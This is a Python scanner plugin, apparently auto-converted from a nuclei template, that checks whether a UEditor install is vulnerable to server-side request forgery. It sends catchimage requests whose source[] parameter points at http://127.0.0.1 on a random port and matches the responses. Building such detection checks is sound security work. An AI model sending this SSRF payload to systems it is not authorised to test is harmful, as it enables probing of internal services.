#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# 自动生成 by tools/convert_nuclei.py — 勿手改
# source_repo : nuclei-templates
# template    : http/vulnerabilities/ueditor/ueditor-ssrf.yaml  (MIT License)
# cve         : ueditor-ssrf
# risk_class  : read_only  (read_only=可入可用集; risky/excluded=仅清单标记, 默认不加载)
# description : UEditor contains an Server Side Request Forgery vulnerability.

import pathlib
import re
import sys
from typing import Any, Tuple

try:
    from utils import PLUGIN_TYPE, plugin, urlutil
except Exception:
    sys.path.append(pathlib.Path(__file__).parent.parent.parent.__str__())
    from utils import PLUGIN_TYPE, plugin, urlutil

REQS = [{'req_idx': 0, 'method': 'GET', 'path': '{{BaseURL}}/ueditor/php/controller.php?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png', 'headers': {}, 'body': None, 'redirects': False, 'from_raw': False, 'matchers_condition': 'and'}, {'req_idx': 1, 'method': 'GET', 'path': '{{BaseURL}}/ueditor/jsp/controller.jsp?action=catchimage&source[]=http://127.0.0.1:{{rand_text_numeric(6)}}/?1.png', 'headers': {}, 'body': None, 'redirects': False, 'from_raw': False, 'matchers_condition': 'and'}]
MATCHERS = [{'type': 'word', 'part': 'body', 'condition': 'and', 'negative': False, 'case_insensitive': False, 'internal': False, 'words': ['\\u94fe\\u63a5\\u4e0d\\u53ef\\u7528', '"original":', '"SUCCESS"'], 'req_idx': 0}, {'type': 'status', 'part': 'body', 'condition': 'or', 'negative': False, 'case_insensitive': False, 'internal': False, 'status': [200], 'req_idx': 0}, {'type': 'word', 'part': 'body', 'condition': 'and', 'negative': False, 'case_insensitive': False, 'internal': False, 'words': ['\\u94fe\\u63a5\\u4e0d\\u53ef\\u7528', '"original":', '"SUCCESS"'], 'req_idx': 1}, {'type': 'status', 'part': 'body', 'condition': 'or', 'negative': False, 'case_insensitive': False, 'internal': False, 'status': [200], 'req_idx': 1}]
# L2 产品门控元数据（UPGRADE_PLAN §4.11）：模板 tags/metadata 提取的产品关键词, 无则 None
FINGERPRINT = ['ueditor']


class Plugin(plugin.PluginBase):
    def set_info(self):
        info = plugin.Info(
            name='UEditor - Server Side Request Forgery',
            catalog='ueditor-ssrf',
            itype=PLUGIN_TYPE.POC,
            protocol='http',
            port=80,
            ssl_protocol='https',
            ssl_port=443,
            requires=['http', 'https'],
        )
        # Info 基类暂无 fingerprint 字段（不改 utils/）, 直接挂属性供 L2 门控读取
        info.fingerprint = FINGERPRINT
        return info

    def _sub(self, text, url):
        if not text:
            return text
        origin = url.get_origin()
        root = '{}://{}'.format(url.protocol or 'http', url.netloc or url.host or '')
        host = url.netloc or '{}:{}'.format(url.host, url.port or self.info.port)
        return (text.replace('{{BaseURL}}', origin)
                    .replace('{{RootURL}}', root)
                    .replace('{{Hostname}}', url.host or '')
                    .replace('{{Host}}', host)
                    .replace('{{Port}}', str(url.port or self.info.port))
                    .replace('{{Scheme}}', url.protocol or 'http'))

    def _parts(self, response):
        headers_all = []
        for k, v in response.headers.items():
            headers_all.append('{}: {}'.format(k, v))
            headers_all.append('{}: {}'.format(k.lower(), v))
        headers_str = '\n'.join(headers_all)
        body = response.text or ''
        return {
            'body': body,
            'header': headers_str,
            'all': body + '\n' + headers_str,
            'response': body + '\n' + headers_str,
            'raw_response': body + '\n' + headers_str,
            'content_type': str(response.headers.get('Content-Type', '')),
            'location': str(response.headers.get('Location', '')),
        }

    def _msg_hit(self, text, content, mc, ci):
        if ci:
            text = text.lower()
            content = [x.lower() for x in content]
        if mc == 'and':
            return all(x in text for x in content)
        return any(x in text for x in content)

    def _match_one(self, response, m):
        ok = False
        if m['type'] == 'status':
            ok = response.status_code in m['status']
        else:
            text = self._parts(response).get(m['part'], '')
            if m['type'] == 'word':
                ok = self._msg_hit(text, m['words'], m['condition'], m['case_insensitive'])
            elif m['type'] == 'regex':
                # 缺陷2修复: regex 分支按 m['condition'] 聚合 (and=全部正则命中, or=任一中即可)
                # 之前只循环任一命中即 ok=True, 把 condition:and 实现成了 OR —— 误报根源。
                rx_hits = []
                for rx in m['regex']:
                    try:
                        if m['case_insensitive']:
                            rx_hits.append(re.search(rx, text, re.S | re.I) is not None)
                        else:
                            rx_hits.append(re.search(rx, text, re.S) is not None)
                    except re.error:
                        rx_hits.append(False)
                ok = all(rx_hits) if m.get('condition', 'or') == 'and' else any(rx_hits)
        if m['negative']:
            ok = not ok
        return ok

    def run(self, url: urlutil.Url, *args, **kwargs) -> Tuple[bool, Any]:
        if not url.protocol:
            url.protocol, url.port = self.https_or_http(url)
        if not url.protocol:
            return False, 'the network protocol does not match.'
        http = self.make_http_client()
        for req in REQS:
            target = self._sub(req['path'], url)
            if not target.startswith('http'):
                target = url.get_origin() + ('/' + target.lstrip('/') if target else '/')
            headers = None
            if req.get('headers'):
                headers = {k: self._sub(str(v), url) for k, v in req['headers'].items()}
            body = self._sub(req.get('body'), url) if req.get('body') else None
            err, resp = http.rq(target, method=req['method'], data=body, headers=headers,
                                allow_redirects=req.get('redirects', True))
            if err:
                # 请求异常上抛, 不折成 SAFE: 引擎 do_testing 捕获后记 WARN (四态契约)
                raise err
            mats = [m for m in MATCHERS if m.get('req_idx') == req.get('req_idx')]
            if not mats:
                return False, 'no matchers for request'
            results = [self._match_one(resp, m) for m in mats]
            hit = all(results) if req.get('matchers_condition', 'or') == 'and' else any(results)
            if hit:
                # 缺陷1修复: 只有「含非 internal matcher 的请求块命中」才产生最终结果。
                # nuclei 语义: 无 flow 多请求块 = 逐块独立执行/匹配 (OR 聚合);
                # internal=true matcher 命中只抑制打印, 不产生可见结果, 也不阻塞后续请求。
                # 因此: 全 internal 块命中 -> 继续发后续请求; 非 internal 块命中 -> 报。
                if any(not m.get('internal', False) for m in mats):
                    return True, 'matched {} on {} status={}'.format(req['method'], target, resp.status_code)
        return False, 'no match'


if __name__ == '__main__':
    plg = Plugin()
    print(plg.info.name, plg.info.catalog)
